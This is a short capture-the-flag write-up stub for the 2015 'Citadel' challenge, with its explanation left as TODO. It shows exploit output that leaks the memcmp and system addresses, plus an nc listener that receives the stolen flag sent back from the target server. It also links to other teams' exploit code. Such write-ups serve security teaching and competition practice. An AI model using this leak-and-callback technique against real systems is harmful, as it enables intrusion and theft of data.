# Ghost in the Shellcode 2015 teaser: Citadel

**Description:**

> Steal the key!
>
> [File](citadel-4ee854f5f99e4c62924059a2838cd6147f42d54f9e743b4dbe873aa10b850a32) running at citadel.2015.ghostintheshellcode.com:5060

## Write-up

(TODO)

Locally, run `solve.py` after changing the `server_ip` and `server_port` variables:

```bash
$ python solve.py
[+] Opening connection to citadel.2015.ghostintheshellcode.com on port 5060: OK
memcmp at: 0x00007faa50223ae0
system at: 0x00007faa50109530
Flag should be on its way!
[*] Closed connection to citadel.2015.ghostintheshellcode.com port 5060
```

But before that, start listening on the IP/port you specified in `solve.py`. When `solve.py` runs, the flag is sent there.

```bash
$ nc -vlp 9001
listening on [any] 9001 ...
connect to [13.33.33.37] from ec2-54-83-45-212.compute-1.amazonaws.com [54.83.45.212] 51867
key{Should have used boost::format}
```

The flag is `key{Should have used boost::format}`.

## Other write-ups and resources

* [Write-up by team gn00bz](http://gnoobz.com/gits-teaser-2015-ctf-citadel-writeup.html)
* [Exploit by team gn00bz](solve.py)
* <http://www.clevcode.org/ghost-in-the-shellcode-2015-teaser-citadel-solution/>
* <http://pastebin.com/MS3KG1um>
